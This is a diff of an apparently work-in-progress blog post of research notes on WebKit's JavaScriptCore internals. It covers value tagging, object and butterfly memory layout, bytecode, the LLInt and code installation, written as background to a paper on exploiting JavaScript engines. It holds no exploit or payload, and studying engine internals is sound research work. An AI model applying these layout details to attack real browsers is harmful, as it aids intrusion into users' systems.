@@ -2,18 +2,17 @@
 layout: post
 comments: true
 title: "Notes on JavaScriptCore"
-tags: [Webkit, browser, gdb]
+tags: [WIP, Webkit, browser, gdb]
 ---
 
-In this post I want to add some pratical notes (and maybe a new tool)
-to the [paper from saelo](http://phrack.com/papers/attacking_javascript_engines.html)
-about exploiting modern browsers; in particular Webkit.
+In this post I want to add some pratical notes (and maybe a new tool) to the
+[paper from saelo](http://phrack.com/papers/attacking_javascript_engines.html)
+about exploiting modern browsers; in particular I'll focus on Webkit and as in
+his paper, I'll deep dive into the source code of that version of webkit.
 
-As in his paper, I'll deep dive into the source code of that version of webkit.
-
-Since seems that doesn't exist a documentation for the its code base you
+Since seems that doesn't exist a documentation for the WebKit's source code you
 can take this as a getting started if you want to hack its code. Do not take
-this post as source of truth, it contains my notes that I collected during
+this post as source of truth though, it contains my notes that I collected during
 the study. Moreover, for now it's about an outdated code base from 2016,
 while I think the root of data types and classes is the same, probably
 some little to medium details have changed.
@@ -32,6 +31,64 @@ that since this is a Javascript engine, it must have a way to represent primitiv
 values; the main trick to distinguish between data type is the tagging of the
 actual value in memory.
 
+The way is done is explained in the source code (one of the few comments
+existing in the source code)
+
+```c++
+/*
+ * On 64-bit platforms USE(JSVALUE64) should be defined, and we use a NaN-encoded
+ * form for immediates.
+ *
+ * The encoding makes use of unused NaN space in the IEEE754 representation.  Any value
+ * with the top 13 bits set represents a QNaN (with the sign bit set).  QNaN values
+ * can encode a 51-bit payload.  Hardware produced and C-library payloads typically
+ * have a payload of zero.  We assume that non-zero payloads are available to encode
+ * pointer and integer values.  Since any 64-bit bit pattern where the top 15 bits are
+ * all set represents a NaN with a non-zero payload, we can use this space in the NaN
+ * ranges to encode other values (however there are also other ranges of NaN space that
+ * could have been selected).
+ *
+ * This range of NaN space is represented by 64-bit numbers begining with the 16-bit
+ * hex patterns 0xFFFE and 0xFFFF - we rely on the fact that no valid double-precision
+ * numbers will fall in these ranges.
+ *
+ * The top 16-bits denote the type of the encoded JSValue:
+ *
+ *     Pointer {  0000:PPPP:PPPP:PPPP
+ *              / 0001:****:****:****
+ *     Double  {         ...
+ *              \ FFFE:****:****:****
+ *     Integer {  FFFF:0000:IIII:IIII
+ *
+ * The scheme we have implemented encodes double precision values by performing a
+ * 64-bit integer addition of the value 2^48 to the number. After this manipulation
+ * no encoded double-precision value will begin with the pattern 0x0000 or 0xFFFF.
+ * Values must be decoded by reversing this operation before subsequent floating point
+ * operations may be peformed.
+ *
+ * 32-bit signed integers are marked with the 16-bit tag 0xFFFF.
+ *
+ * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean,
+ * null and undefined values are represented by specific, invalid pointer values:
+ *
+ *     False:     0x06
+ *     True:      0x07
+ *     Undefined: 0x0a
+ *     Null:      0x02
+ *
+ * These values have the following properties:
+ * - Bit 1 (TagBitTypeOther) is set for all four values, allowing real pointers to be
+ *   quickly distinguished from all immediate values, including these invalid pointers.
+ * - With bit 3 is masked out (TagBitUndefined) Undefined and Null share the
+ *   same value, allowing null & undefined to be quickly detected.
+ *
+ * No valid JSValue will have the bit pattern 0x0, this is used to represent array
+ * holes, and as a C++ 'no value' result (e.g. JSValue() has an internal value of 0).
+ */
+```
+
+To recap the bit-pattern for the immediate is the following:
+
 ```
 0x00 00000000 empty (internal value)
 0x02 00000010 null
@@ -43,12 +100,49 @@ actual value in memory.
           `--------------> TagBitUndefined
 ```
 
+### Inheritance
 
 An interesting part is how the webkit's code deals with some of characteristics
 of ``C++`` language: missing ``super`` and ``instanceof``:
 
- - ``super`` is implemented using the ``ClassInfo``
- - ``instanceof`` is implemented also via ``JSType`` enum
+for ``super`` it's used the following pattern
+
+```c++
+class CodeBlock : public JSCell {
+    typedef JSCell Base;
+...
+};
+```
+
+that allows for the following
+
+```c++
+void CodeBlock::finishCreation(VM& vm, CopyParsedBlockTag, CodeBlock& other)
+{
+    Base::finishCreation(vm);
+    ...
+}
+```
+
+It's not always so straightforward, for example the inheritance in the ``JSArray`` class:
+
+```c++
+bool JSArray::getOwnPropertySlot(JSObject* object, ExecState* exec, PropertyName propertyName, PropertySlot& slot)
+{
+    JSArray* thisObject = jsCast<JSArray*>(object);
+    if (propertyName == exec->propertyNames().length) {
+        unsigned attributes = thisObject->isLengthWritable() ? DontDelete | DontEnum : DontDelete | DontEnum | ReadOnly;
+        slot.setValue(thisObject, attributes, jsNumber(thisObject->length()));
+        return true;
+    }
+
+    return JSObject::getOwnPropertySlot(thisObject, exec, propertyName, slot);
+}
+```
+
+uses directly ``JSObject`` and not the ``JSNonFinalObject`` that is its own direct parent.
+
+``instanceof`` instead is used via ``ClassInfo`` and ``JSType`` enum
 
 
 ```c++
@@ -84,22 +178,52 @@ inline const ClassInfo* JSCell::classInfo() const
 }
 ```
 
-An example of inheritance is the following in the ``JSArray`` class:
+Each class that needs this information has a macro at its disposal
 
 ```c++
-bool JSArray::getOwnPropertySlot(JSObject* object, ExecState* exec, PropertyName propertyName, PropertySlot& slot)
-{
-    JSArray* thisObject = jsCast<JSArray*>(object);
-    if (propertyName == exec->propertyNames().length) {
-        unsigned attributes = thisObject->isLengthWritable() ? DontDelete | DontEnum : DontDelete | DontEnum | ReadOnly;
-        slot.setValue(thisObject, attributes, jsNumber(thisObject->length()));
-        return true;
-    }
+#define DECLARE_EXPORT_INFO                                             \
+    protected:                                                          \
+        static JS_EXPORTDATA const ::JSC::ClassInfo s_info;             \
+    public:                                                             \
+        static const ::JSC::ClassInfo* info() { return &s_info; }
 
-    return JSObject::getOwnPropertySlot(thisObject, exec, propertyName, slot);
-}
+const ClassInfo JSObject::s_info = { "Object", 0, 0, CREATE_METHOD_TABLE(JSObject) };
+
 ```
 
+with
+
+```c++
+#define CREATE_METHOD_TABLE(ClassName) { \
+        &ClassName::destroy, \
+        &ClassName::visitChildren, \
+        &ClassName::copyBackingStore, \
+        &ClassName::getCallData, \
+        &ClassName::getConstructData, \
+        &ClassName::put, \
+        &ClassName::putByIndex, \
+        &ClassName::deleteProperty, \
+        &ClassName::deletePropertyByIndex, \
+        &ClassName::getOwnPropertySlot, \
+        &ClassName::getOwnPropertySlotByIndex, \
+        &ClassName::toThis, \
+        &ClassName::defaultValue, \
+        &ClassName::getOwnPropertyNames, \
+        &ClassName::getOwnNonIndexPropertyNames, \
+        &ClassName::getPropertyNames, \
+        &ClassName::getEnumerableLength, \
+        &ClassName::getStructurePropertyNames, \
+        &ClassName::getGenericPropertyNames, \
+        &ClassName::className, \
+        &ClassName::customHasInstance, \
+        &ClassName::defineOwnProperty, \
+        &ClassName::slowDownAndWasteMemory, \
+        &ClassName::getTypedArrayImpl, \
+        &ClassName::dumpToStream, \
+        &ClassName::estimatedSize \
+    }, \
+    ClassName::TypedArrayStorageType
+```
 
 ### JSCell
 
@@ -358,13 +482,26 @@ With all of this in mind, it's good to know that exists a method to calculate
 the **base** of the butterfly instance
 
 ```c++
+IndexingHeader* Butterfly::indexingHeader() { return IndexingHeader::from(this); }
+
+static IndexingHeader* IndexingHeader::from(Butterfly* butterfly)
+{
+    return reinterpret_cast<IndexingHeader*>(butterfly) - 1;
+}
+
 inline void* Butterfly::base(Structure* structure)
 {
     return base(indexingHeader()->preCapacity(structure), structure->outOfLineCapacity());
 }
 ```
 
+where ``IndexingHeader`` is a class similar the to ``Butterfly`` itself, honestly
+I don't understand precisely why some functionalities are inside it, probably
+it's used to handle array-like objects.
+
 ### JSObject
+
+This is the base class for all the "javascript" things.
 
 In memory a ``JSObject`` is composed by only two quadword as "header", followed
 of a couple of inline properties:
@@ -524,10 +661,6 @@ inline bool Structure::hasIndexingHeader(const JSCell* cell) const
 }
 ```
 
-### Inheritance
-
-
-
 ### Functions and Bytecode
 
 This section is very important and it's related to something that saelo touched
@@ -553,6 +686,8 @@ layout is the following:
 
 #### ExecutableBase
 
+It's where the "code is"; this is its memory footprint
+
 ```
 0x00.----.----.----.----.----.----.----.----.----.----.----.----.----.----.----.----.
     |                 JSCell                |                   |                   |
@@ -562,6 +697,485 @@ layout is the following:
     |       m_jitCodeForCallWithArityCheck  |
      ----'----'----'----'----'----'----'----'
 ```
+
+The ``m_jitCodeFor*`` contains the instructions that will be executed.
+
+#### Bytecode
+
+The source of truth is the **bytecode**: the opcodes for it are defined into
+``Source/JavaScriptCore/bytecode/BytecodeList.json``
+```json
+[
+    {
+        "section" : "Bytecodes", "emitInHFile" : true, "emitInASMFile" : true, 
+        "macroNameComponent" : "BYTECODE", "asmPrefix" : "llint_", 
+        "bytecodes" : [
+            { "name" : "op_enter", "length" : 1 },
+            { "name" : "op_get_scope", "length" : 2 },
+            { "name" : "op_create_direct_arguments", "length" : 2 },
+            ...
+        ]
+    }
+]
+```
+
+from it are generated  ``Bytecode.h``;
+
+
+```c++
+// Source/JavaScriptCore/bytecode/UnlinkedCodeBlock.h
+struct UnlinkedInstruction {
+    UnlinkedInstruction() { u.operand = 0; }
+    UnlinkedInstruction(OpcodeID opcode) { u.opcode = opcode; }
+    UnlinkedInstruction(int operand) { u.operand = operand; }
+    union {
+        OpcodeID opcode;
+        int32_t operand;
+        unsigned index;
+    } u;
+};
+
+// Source/JavaScriptCore/bytecode/UnlinkedInstructionStream.h
+// Unlinked instructions are packed in a simple stream format.
+//
+// The first byte is always the opcode.
+// It's followed by an opcode-dependent number of argument values.
+// The first 3 bits of each value determines the format:
+//
+//     5-bit positive integer (1 byte total)
+//     5-bit negative integer (1 byte total)
+//     13-bit positive integer (2 bytes total)
+//     13-bit negative integer (2 bytes total)
+//     5-bit constant register index, based at 0x40000000 (1 byte total)
+//     13-bit constant register index, based at 0x40000000 (2 bytes total)
+//     32-bit raw value (5 bytes total)
+ALWAYS_INLINE const UnlinkedInstruction* UnlinkedInstructionStream::Reader::next()
+{
+    m_unpackedBuffer[0].u.opcode = static_cast<OpcodeID>(read8());
+    unsigned opLength = opcodeLength(m_unpackedBuffer[0].u.opcode);
+    for (unsigned i = 1; i < opLength; ++i)
+        m_unpackedBuffer[i].u.index = read32();
+    return m_unpackedBuffer;
+}
+```
+
+**Note:** since then [the bytecode format is changed](https://webkit.org/blog/9329/a-new-bytecode-format-for-javascriptcore/).
+
+### LLInt
+
+The first tier of **execution engine** is the **Low Level Interpreter**, the first
+time some javascript code is executed, it's here that happens.
+
+```c++
+static void JSC::setupLLInt(VM& vm, CodeBlock* codeBlock)
+{
+    LLInt::setEntrypoint(vm, codeBlock);
+}
+
+void JSC::LLInt::setEntrypoint(VM& vm, CodeBlock* codeBlock)
+{
+    switch (codeBlock->codeType()) {
+    ...
+    case FunctionCode:
+        setFunctionEntrypoint(vm, codeBlock);
+        return;
+    }
+    ...
+}
+
+static void JSC::LLInt::setFunctionEntrypoint(VM& vm, CodeBlock* codeBlock)
+{
+    CodeSpecializationKind kind = codeBlock->specializationKind();
+    
+#if ENABLE(JIT)
+    if (vm.canUseJIT()) {
+        if (kind == CodeForCall) {
+            codeBlock->setJITCode(
+                adoptRef(new DirectJITCode(vm.getCTIStub(functionForCallEntryThunkGenerator), vm.getCTIStub(functionForCallArityCheckThunkGenerator).code(), JITCode::InterpreterThunk)));
+            return;
+        }
+        ...
+    }
+#endif // ENABLE(JIT)
+    ...
+}
+
+MacroAssemblerCodeRef JSC::LLInt::functionForCallEntryThunkGenerator(VM* vm)
+{
+    return generateThunkWithJumpTo(vm, LLInt::getCodeFunctionPtr(llint_function_for_call_prologue), "function for call");
+}
+
+static MacroAssemblerCodeRef JSC::LLInt::generateThunkWithJumpTo(VM* vm, void (*target)(), const char *thunkKind)
+{
+    JSInterfaceJIT jit(vm);
+    
+    // FIXME: there's probably a better way to do it on X86, but I'm not sure I care.
+    jit.move(JSInterfaceJIT::TrustedImmPtr(bitwise_cast<void*>(target)), JSInterfaceJIT::regT0);
+    jit.jump(JSInterfaceJIT::regT0);
+    
+    LinkBuffer patchBuffer(*vm, jit, GLOBAL_THUNK_ID);
+    return FINALIZE_CODE(patchBuffer, ("LLInt %s prologue thunk", thunkKind));
+}
+```
+
+The last line is what print the line
+
+```
+Generated JIT code for LLInt program prologue thunk:
+    Code at [0x7f9dd79ffc80, 0x7f9dd79ffca0):
+      0x7f9dd79ffc80: movq $0x7f9e1ad7dc1d, %rax
+      0x7f9dd79ffc8a: jmpq %rax
+```
+
+when ``JSC_dumpDisassembly=true`` is in the environment variables.
+
+```
+# Do the bare minimum required to execute code. Sets up the PC, leave the CodeBlock*
+# in t1. May also trigger prologue entry OSR.
+macro prologue(codeBlockGetter, codeBlockSetter, osrSlowPath, traceSlowPath)
+    # Set up the call frame and check if we should OSR.
+    preserveCallerPCAndCFR()
+
+    if EXECUTION_TRACING
+        subp maxFrameExtentForSlowPathCall, sp
+        callSlowPath(traceSlowPath)
+        addp maxFrameExtentForSlowPathCall, sp
+    end
+    codeBlockGetter(t1)
+    if not C_LOOP
+        baddis 5, CodeBlock::m_llintExecuteCounter + BaselineExecutionCounter::m_counter[t1], .continue
+        ...
+```
+
+```
+# Utilities.
+macro jumpToInstruction()
+    jmp [PB, PC, 8]
+end
+
+macro dispatch(advance)
+    addp advance, PC
+    jumpToInstruction()
+end
+
+```
+
+``Source/JavaScriptCore/llint/LowLevelInterpreter.asm``
+
+and the assembler is at ``Source/JavaScriptCore/offlineasm/asm.rb`` and it's compiled
+into the generated ``obj/DerivedSources/JavaScriptCore/LLIntAssembly.h``
+
+```asm
+OFFLINE_ASM_GLOBAL_LABEL(vmEntryToJavaScript)
+    "\tpush %rbp\n"                                          // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:669
+    "\tmovq %rsp, %rbp\n"                                    // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:676
+    "\tmovq %rbp, %rsp\n"                                    // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:691
+    "\tsubq $32, %rsp\n"
+    "\tmovq %rsp, %r8\n"                                     // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:420
+    "\tandq $15, %r8\n"
+    "\ttestq %r8, %r8\n"                                     // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:422
+    "\tjz " LOCAL_LABEL_STRING(_offlineasm_doVMEntry__checkStackackPointerOkay) "\n"
+    "\tmovq $3134249985, %r8\n"                              // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:423
+    "\tint $3\n"                                             // Source/JavaScriptCore/llint/LowLevelInterpreter.asm:424
+```
+
+## Runtime analysis
+
+Now that I showed an overview of the data types existing I can dive a little
+deeper and understand how they link together.
+
+I start showing how something entered from the ``jsc`` console is parsed
+and executed:
+
+``-d`` enable the dumping of the bytecode on the fly
+
+```c++
+// Source/JavaScriptCore/jsc.cpp
+static void runInteractive(GlobalObject* globalObject)
+{
+    String interpreterName(ASCIILiteral("Interpreter"));
+    
+    bool shouldQuit = false;
+    while (!shouldQuit) {
+        printf("%s", interactivePrompt);
+        Vector<char, 256> line;
+        int c;
+        while ((c = getchar()) != EOF) {
+            // FIXME: Should we also break on \r? 
+            if (c == '\n')
+                break;
+            line.append(c);
+        }
+        if (line.isEmpty())
+            break;
+
+        NakedPtr<Exception> evaluationException;
+        JSValue returnValue = evaluate(
+            globalObject->globalExec(),
+            jscSource(line, interpreterName),  // [1]
+            JSValue(),
+            evaluationException);
+
+        if (evaluationException)
+            printf("Exception: %s\n", evaluationException->value().toString(globalObject->globalExec())->value(globalObject->globalExec()).utf8().data());
+        else
+            printf("%s\n", returnValue.toString(globalObject->globalExec())->value(globalObject->globalExec()).utf8().data());
+
+        globalObject->globalExec()->clearException();
+        globalObject->vm().drainMicrotasks();
+    }
+    printf("\n");
+}
+```
+
+``jscSource`` at ``[1]`` is like a wrapper class around the literal text passed to the interpreter.
+
+```c++
+JSValue Interpreter::execute(ProgramExecutable* program, CallFrame* callFrame, JSObject* thisObj)
+{
+    SamplingScope samplingScope(this);
+
+    JSScope* scope = thisObj->globalObject()->globalScope();
+    VM& vm = *scope->vm();
+
+    ...
+
+    // First check if the "program" is actually just a JSON object. If so,
+    // we'll handle the JSON object here. Else, we'll handle real JS code
+    // below at failedJSONP.
+
+    Vector<JSONPData> JSONPData;
+    bool parseResult;
+    StringView programSource = program->source().view();
+    if (programSource.isNull())
+        return jsUndefined();
+    if (programSource.is8Bit()) {                                                               // [1]
+        LiteralParser<LChar> literalParser(callFrame, programSource.characters8(), programSource.length(), JSONP);
+        parseResult = literalParser.tryJSONPParse(JSONPData, scope->globalObject()->globalObjectMethodTable()->supportsRichSourceInfo(scope->globalObject()));
+    } else {
+        LiteralParser<UChar> literalParser(callFrame, programSource.characters16(), programSource.length(), JSONP);
+        parseResult = literalParser.tryJSONPParse(JSONPData, scope->globalObject()->globalObjectMethodTable()->supportsRichSourceInfo(scope->globalObject()));
+    }
+
+    if (parseResult) {
+      ...
+    }
+
+failedJSONP:                                                                                     // [2]
+    // If we get here, then we have already proven that the script is not a JSON
+    // object.
+
+    VMEntryScope entryScope(vm, scope->globalObject());
+
+    // Compile source to bytecode if necessary:
+    if (JSObject* error = program->initializeGlobalProperties(vm, callFrame, scope))             // [3]
+        return checkedReturn(callFrame->vm().throwException(callFrame, error));
+
+    if (JSObject* error = program->prepareForExecution(callFrame, nullptr, scope, CodeForCall))  // [4]
+        return checkedReturn(callFrame->vm().throwException(callFrame, error));
+
+    ProgramCodeBlock* codeBlock = program->codeBlock();
+
+    if (UNLIKELY(vm.shouldTriggerTermination(callFrame)))
+        return throwTerminatedExecutionException(callFrame);
+
+    ASSERT(codeBlock->numParameters() == 1); // 1 parameter for 'this'.
+
+    ProtoCallFrame protoCallFrame;
+    protoCallFrame.init(codeBlock, JSCallee::create(vm, scope->globalObject(), scope), thisObj, 1);
+
+    ...
+    // Execute the code:
+    JSValue result;
+    {
+        SamplingTool::CallRecord callRecord(m_sampler.get());
+        result = program->generatedJITCode()->execute(&vm, &protoCallFrame);                     // [5]
+    }
+    ...
+
+    return checkedReturn(result);
+}
+```
+
+### Parsing
+
+This is a backtrace that shows where the parsing is done for a generic function
+
+```
+JSC::parse<JSC::FunctionNode>()                         at Source/JavaScriptCore/parser/Parser.h:1540
+JSC::generateUnlinkedFunctionCodeBlock()                at Source/JavaScriptCore/bytecode/UnlinkedFunctionExecutable.cpp:59
+JSC::UnlinkedFunctionExecutable::unlinkedCodeBlockFor() at Source/JavaScriptCore/bytecode/UnlinkedFunctionExecutable.cpp:203
+JSC::ScriptExecutable::newCodeBlockFor()                at Source/JavaScriptCore/runtime/Executable.cpp:305
+JSC::ScriptExecutable::prepareForExecutionImpl()        at Source/JavaScriptCore/runtime/Executable.cpp:398
+JSC::ScriptExecutable::prepareForExecution()            at Source/JavaScriptCore/runtime/Executable.h:393
+JSC::LLInt::setUpCall()                                 at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1176
+JSC::LLInt::genericCall                                 at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1238
+JSC::LLInt::llint_slow_path_call()                      at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1244
+llint_entry ()                                          at obj/lib/libjavascriptcoregtk-4.0.so.18
+vmEntryToJavaScript ()                                  at obj/lib/libjavascriptcoregtk-4.0.so.18
+JSC::JITCode::execute()                                 at Source/JavaScriptCore/jit/JITCode.cpp:80
+JSC::Interpreter::execute()                             at Source/JavaScriptCore/interpreter/Interpreter.cpp:971
+JSC::evaluate()                                         at Source/JavaScriptCore/runtime/Completion.cpp:106
+runInteractive ()                                       at Source/JavaScriptCore/jsc.cpp:1906
+runJSC(JSC::VM*, CommandLine)                           at Source/JavaScriptCore/jsc.cpp:2056
+jscmain(int, char**)                                    at Source/JavaScriptCore/jsc.cpp:2105
+main(int, char**)                                       at Source/JavaScriptCore/jsc.cpp:1757
+```
+
+or for the "program"
+
+```
+JSC::parse<JSC::ProgramNode>()                       at Source/JavaScriptCore/parser/Parser.h:1540
+JSC::CodeCache::getGlobalCodeBlock<...>()            at Source/JavaScriptCore/runtime/CodeCache.cpp:107
+JSC::CodeCache::getProgramCodeBlock()                at Source/JavaScriptCore/runtime/CodeCache.cpp:137
+JSC::JSGlobalObject::createProgramCodeBlock()        at Source/JavaScriptCore/runtime/JSGlobalObject.cpp:983
+JSC::ProgramExecutable::initializeGlobalProperties() at Source/JavaScriptCore/runtime/Executable.cpp:575
+JSC::Interpreter::execute()                          at Source/JavaScriptCore/interpreter/Interpreter.cpp:948
+JSC::evaluate()                                      at Source/JavaScriptCore/runtime/Completion.cpp:106
+runInteractive()                                     at Source/JavaScriptCore/jsc.cpp:1906
+runJSC()                                             at Source/JavaScriptCore/jsc.cpp:2056
+jscmain()                                            at Source/JavaScriptCore/jsc.cpp:2105
+main()                                               at Source/JavaScriptCore/jsc.cpp:1757
+```
+
+### Bytecode
+
+
+After having defined a function, when is called you have the following
+
+```
+JSC::FunctionNode::emitBytecode()                       at Source/JavaScriptCore/bytecompiler/NodesCodegen.cpp:3047
+JSC::BytecodeGenerator::generate()                      at Source/JavaScriptCore/bytecompiler/BytecodeGenerator.cpp:103
+JSC::generateUnlinkedFunctionCodeBlock()                at Source/JavaScriptCore/bytecode/UnlinkedFunctionExecutable.cpp:75
+JSC::UnlinkedFunctionExecutable::unlinkedCodeBlockFor() at Source/JavaScriptCore/bytecode/UnlinkedFunctionExecutable.cpp:203
+JSC::ScriptExecutable::newCodeBlockFor()                at Source/JavaScriptCore/runtime/Executable.cpp:305
+JSC::ScriptExecutable::prepareForExecutionImpl()        at Source/JavaScriptCore/runtime/Executable.cpp:398
+JSC::ScriptExecutable::prepareForExecution()            at Source/JavaScriptCore/runtime/Executable.h:393
+JSC::LLInt::setUpCall()                                 at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1176
+JSC::LLInt::genericCall()                               at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1238
+JSC::LLInt::llint_slow_path_call()                      at Source/JavaScriptCore/llint/LLIntSlowPaths.cpp:1244
+llint_entry ()                                          at Source/JavaScriptCore/runtime/Identifier.h:142
+vmEntryToJavaScript ()                                  at Source/JavaScriptCore/runtime/Identifier.h:142
+JSC::JITCode::execute()                                 at Source/JavaScriptCore/jit/JITCode.cpp:80
+JSC::Interpreter::execute()                             at Source/JavaScriptCore/interpreter/Interpreter.cpp:971
+JSC::evaluate()                                         at Source/JavaScriptCore/runtime/Completion.cpp:106
+runInteractive()                                        at Source/JavaScriptCore/jsc.cpp:1906
+runJSC()                                                at Source/JavaScriptCore/jsc.cpp:2056
+jscmain()                                               at Source/JavaScriptCore/jsc.cpp:2105
+main()                                                  at Source/JavaScriptCore/jsc.cpp:1757
+```
+
+There is a function that contains both the parsing that the bytecode generation, i.e. ``generateUnlinkedFunctionCodeBlock()``,
+since it's an important function here we go
+
+```c++
+static UnlinkedFunctionCodeBlock* generateUnlinkedFunctionCodeBlock(
+    VM& vm, UnlinkedFunctionExecutable* executable, const SourceCode& source,
+    CodeSpecializationKind kind, DebuggerMode debuggerMode, ProfilerMode profilerMode,
+    UnlinkedFunctionKind functionKind, ParserError& error, SourceParseMode parseMode)
+{
+    JSParserBuiltinMode builtinMode = executable->isBuiltinFunction() ? JSParserBuiltinMode::Builtin : JSParserBuiltinMode::NotBuiltin;
+    JSParserStrictMode strictMode = executable->isInStrictContext() ? JSParserStrictMode::Strict : JSParserStrictMode::NotStrict;
+    ASSERT(isFunctionParseMode(executable->parseMode()));
+    std::unique_ptr<FunctionNode> function = parse<FunctionNode>(
+        &vm, source, executable->name(), builtinMode, strictMode, executable->parseMode(), executable->superBinding(), error, nullptr);
+
+    if (!function) {
+        ASSERT(error.isValid());
+        return nullptr;
+    }
+
+    function->finishParsing(executable->name(), executable->functionMode());
+    executable->recordParse(function->features(), function->hasCapturedVariables());
+
+    bool isClassContext = executable->superBinding() == SuperBinding::Needed;
+
+    UnlinkedFunctionCodeBlock* result = UnlinkedFunctionCodeBlock::create(&vm, FunctionCode,
+        ExecutableInfo(function->usesEval(), function->isStrictMode(), kind == CodeForConstruct, functionKind == UnlinkedBuiltinFunction, executable->constructorKind(), executable->superBinding(), parseMode, executable->derivedContextType(), false, isClassContext));
+
+    auto generator(std::make_unique<BytecodeGenerator>(vm, function.get(), result, debuggerMode, profilerMode, executable->parentScopeTDZVariables()));
+    error = generator->generate();
+    if (error.isValid())
+        return nullptr;
+    return result;
+}
+```
+
+As you can see, the ``function`` variable, that is the result of the parsing
+of the javascript is used to create the instance of ``UnlinkedFunctionCodeBlock``
+(encapsulated inside an instance of ``ExecutableInfo()``). Then ``BytecodeGenerator``
+is instantiated and attached to ``result`` and the generation is triggered via ``generate()``.
+
+
+TODO
+
+```c++
+void CodeBlock::finishCreation(VM& vm, ScriptExecutable* ownerExecutable, UnlinkedCodeBlock* unlinkedCodeBlock,
+    JSScope* scope)
+{
+    Base::finishCreation(vm);
+    ...
+    // Copy and translate the UnlinkedInstructions
+    unsigned instructionCount = unlinkedCodeBlock->instructions().count();
+    UnlinkedInstructionStream::Reader instructionReader(unlinkedCodeBlock->instructions());
+
+    // Bookkeep the strongly referenced module environments.
+    HashSet<JSModuleEnvironment*> stronglyReferencedModuleEnvironments;
+
+    // Bookkeep the merge point bytecode offsets.
+    Vector<size_t> mergePointBytecodeOffsets;
+
+    RefCountedArray<Instruction> instructions(instructionCount);
+
+    for (unsigned i = 0; !instructionReader.atEnd(); ) {
+        const UnlinkedInstruction* pc = instructionReader.next();
+
+        unsigned opLength = opcodeLength(pc[0].u.opcode);
+
+        instructions[i] = vm.interpreter->getOpcode(pc[0].u.opcode);
+        for (size_t j = 1; j < opLength; ++j) {
+            if (sizeof(int32_t) != sizeof(intptr_t))
+                instructions[i + j].u.pointer = 0;
+            instructions[i + j].u.operand = pc[j].u.operand;
+        }
+        switch (pc[0].u.opcode) {
+            ...
+            default:
+            break;
+        }
+        i += opLength;
+    }
+
+    if (vm.controlFlowProfiler())
+        insertBasicBlockBoundariesForControlFlowProfiler(instructions);
+
+    m_instructions = WTFMove(instructions);
+    ...
+    // Set optimization thresholds only after m_instructions is initialized, since these
+    // rely on the instruction count (and are in theory permitted to also inspect the
+    // instruction stream to more accurate assess the cost of tier-up).
+    optimizeAfterWarmUp();
+    jitAfterWarmUp();
+
+    // If the concurrent thread will want the code block's hash, then compute it here
+    // synchronously.
+    if (Options::alwaysComputeHash())
+        hash();
+
+    if (Options::dumpGeneratedBytecodes())
+        dumpBytecode();
+
+    heap()->m_codeBlocks.add(this);
+    heap()->reportExtraMemoryAllocated(m_instructions.size() * sizeof(Instruction));
+}
+```
+
+### Execution
+
+but it's transformed into bytecode **only the first time**, probably is cached in the
+following calls. The function that does something is ``ScriptExecutable::installCode()``
+at the and of ``ScriptExecutable::prepareForExecutionImpl()`` that via ``ScriptExecutable::newCodeBlockFor()``
+generates the bytecode.
 
 ```c++
 class NativeExecutable final : public ExecutableBase {
@@ -610,7 +1224,7 @@ JSObject* ScriptExecutable::prepareForExecutionImpl(
         return createError(exec->callerFrame(), ASCIILiteral("Forced Failure"));
 
     JSObject* exception = 0;
-    CodeBlock* codeBlock = newCodeBlockFor(kind, function, scope, exception);
+    CodeBlock* codeBlock = newCodeBlockFor(kind, function, scope, exception);                        [1]
     if (!codeBlock) {
         RELEASE_ASSERT(exception);
         return exception;
@@ -620,89 +1234,69 @@ JSObject* ScriptExecutable::prepareForExecutionImpl(
         codeBlock->validate();
     
     if (Options::useLLInt())
-        setupLLInt(vm, codeBlock);
+        setupLLInt(vm, codeBlock);                                                                    [2a]
     else
-        setupJIT(vm, codeBlock);
+        setupJIT(vm, codeBlock);                                                                      [2b]
     
-    installCode(*codeBlock->vm(), codeBlock, codeBlock->codeType(), codeBlock->specializationKind());
+    installCode(*codeBlock->vm(), codeBlock, codeBlock->codeType(), codeBlock->specializationKind()); [3]
     return 0;
 }
 ```
 
-### Parsing
+The juice happens in ``prepareForExecutionImpl()``: at ``[1]`` the **bytecode** is generated,
+at ``[2a/2b]`` the ``JIT`` code is generated and saved into the instance and finally at ``[3]``
+the instructions from the CodeBlock are "installed":
 
+```c++
+void ScriptExecutable::installCode(VM& vm, CodeBlock* genericCodeBlock, CodeType codeType, CodeSpecializationKind kind)
+{
+    ...
+    CodeBlock* oldCodeBlock = nullptr;
+    
+    switch (codeType) {
+      ...
+    case FunctionCode: {
+        FunctionExecutable* executable = jsCast<FunctionExecutable*>(this);
+        FunctionCodeBlock* codeBlock = static_cast<FunctionCodeBlock*>(genericCodeBlock);
+        
+        switch (kind) {
+        case CodeForCall:
+            oldCodeBlock = executable->m_codeBlockForCall.get();
+            executable->m_codeBlockForCall.setMayBeNull(vm, this, codeBlock);
+            break;
+        case CodeForConstruct:
+            oldCodeBlock = executable->m_codeBlockForConstruct.get();
+            executable->m_codeBlockForConstruct.setMayBeNull(vm, this, codeBlock);
+            break;
+        }
+        break;
+    }
+    }
+
+    switch (kind) {
+    case CodeForCall:
+        m_jitCodeForCall = genericCodeBlock ? genericCodeBlock->jitCode() : nullptr;
+        m_jitCodeForCallWithArityCheck = MacroAssemblerCodePtr();
+        m_numParametersForCall = genericCodeBlock ? genericCodeBlock->numParameters() : NUM_PARAMETERS_NOT_COMPILED;
+        break;
+     ...
+    }
+    ...
+}
 ```
-JSC::parse<JSC::ProgramNode>()                       at Source/JavaScriptCore/parser/Parser.h:1540
-JSC::CodeCache::getGlobalCodeBlock<...>()            at Source/JavaScriptCore/runtime/CodeCache.cpp:107
-JSC::CodeCache::getProgramCodeBlock()                at Source/JavaScriptCore/runtime/CodeCache.cpp:137
-JSC::JSGlobalObject::createProgramCodeBlock()        at Source/JavaScriptCore/runtime/JSGlobalObject.cpp:983
-JSC::ProgramExecutable::initializeGlobalProperties() at Source/JavaScriptCore/runtime/Executable.cpp:575
-JSC::Interpreter::execute()                          at Source/JavaScriptCore/interpreter/Interpreter.cpp:948
